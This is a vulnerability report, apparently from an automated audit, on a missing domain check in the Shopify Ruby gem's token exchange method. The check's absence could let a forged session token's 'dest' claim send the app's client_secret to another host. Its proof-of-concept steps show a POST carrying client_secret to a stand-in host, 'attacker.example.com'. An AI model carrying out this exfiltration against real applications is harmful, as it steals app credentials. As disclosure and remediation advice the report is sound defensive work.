### Title
SSRF and client_secret exfiltration via unvalidated JWT `dest` claim in `TokenExchange.exchange_token` - (File: lib/shopify_api/auth/token_exchange.rb)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the shop used to build the OAuth "access_token" request destination directly from the unvalidated `dest` claim of the caller-supplied session token, unlike the sibling methods `client_credentials` and `migrate_to_expiring_token`, which pass the shop through `Utils::ShopValidator.sanitize!` before use.

### Finding Description
`exchange_token` decodes the JWT session token and takes `dest_shop = jwt_payload.shop`, where `JwtPayload#shop` simply strips `"https://"` off the raw `dest` claim string with no host/domain check: `@dest.gsub("https://", "")` [3](#0-2) . The only integrity check performed on the token is the JWT signature and the `aud == Context.api_key` check [4](#0-3) ; there is no verification that `dest` is a `*.myshopify.com` (or otherwise trusted) domain.

`dest_shop` is then used unvalidated to build `shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)`, which becomes the base URI for the outbound HTTP request that carries the app's `client_id`/`client_secret` in the request body: `client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")` [2](#0-1) . `HttpClient#initialize` sets `@base_uri = "https://#{api_host || session.shop}"` with zero domain validation [1](#0-0) , so the POST (containing `client_secret` in the JSON body) goes to `https://#{dest_shop}/admin/oauth/access_token`.

This breaks the intended identity binding: *the host that receives the app's `client_secret`* should equal *a Shopify-trusted domain*, but here it equals *whatever string is embedded in the `dest` claim of a token the caller supplies to `exchange_token`*. Notably, the codebase already recognizes this exact risk class and mitigates it elsewhere: both `ClientCredentials.client_credentials` (`validated_shop = Utils::ShopValidator.sanitize!(shop)` [5](#0-4) ) and `TokenExchange.migrate_to_expiring_token` (`validated_shop = Utils::ShopValidator.sanitize!(shop)` [6](#0-5) ) sanitize the shop against `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` before using it to build an outbound request. `exchange_token` is missing this same call on `dest_shop`.

Whether `dest` can actually be attacker-influenced depends on Shopify's own token issuance guarantees (out of this gem's control), which limits certainty about real-world exploitability from this gem's code alone.

### Impact Explanation
If an attacker can supply (or influence) a session token whose signature validates against the app's `api_secret_key`/`old_api_secret_key` but whose `dest` claim is not a genuine Shopify shop domain, calling `exchange_token` causes the host application to send the app's `client_id` and `client_secret` to an attacker-chosen host — SSRF carrying the app's credentials, matching the "High" impact bucket (SSRF with the app's credentials / credential leakage). This is the same "unbound field" pattern as the report's core bug class: a value (the finalization state / here, the `dest` host) is trusted for a downstream sensitive action without being validated against the expected trust boundary.

### Likelihood Explanation
Exploitability hinges entirely on whether an unprivileged actor can obtain or forge a session token with a valid signature (under the app's real `api_secret_key`) but an arbitrary `dest` value — a precondition outside this gem's code, since token issuance is controlled by Shopify/Identity. Given that this gem's own authors already added `ShopValidator.sanitize!` guards on the twin methods (`client_credentials`, `migrate_to_expiring_token`) that accept caller-supplied shop strings, this indicates the pattern is treated as a real risk internally, but `exchange_token`'s reliance on `dest` (a claim inside a token whose issuance is normally fully Shopify-controlled) makes the likelihood harder to assess with certainty than for the other two entry points which take `shop` directly as a raw, always-untrusted parameter.

### Recommendation
Validate `dest_shop` with `Utils::ShopValidator.sanitize!(dest_shop)` in `TokenExchange.exchange_token` before constructing `shop_session`/`Clients::HttpClient`, mirroring the existing calls in `ClientCredentials.client_credentials` and `TokenExchange.migrate_to_expiring_token`, so that the destination of the `client_secret`-bearing request is always constrained to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Proof of Concept
1. Obtain (or forge, if issuance-side controls are weaker than expected) a JWT session token that passes `JwtPayload` validation (`aud == Context.api_key`, valid signature, not expired) but whose `dest` claim is `"https://attacker.example.com"`.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: forged_token, requested_token_type: ...)`.
3. `jwt_payload.shop` returns `"attacker.example.com"` unvalidated [3](#0-2) ; `shop_session.shop` is set to this value and used to build the request base URI without any `ShopValidator` check [2](#0-1) .
4. The gem issues `POST https://attacker.example.com/admin/oauth/access_token` with `client_id` and `client_secret` in the JSON body [1](#0-0) , exfiltrating the app's `client_secret` to the attacker-controlled host.
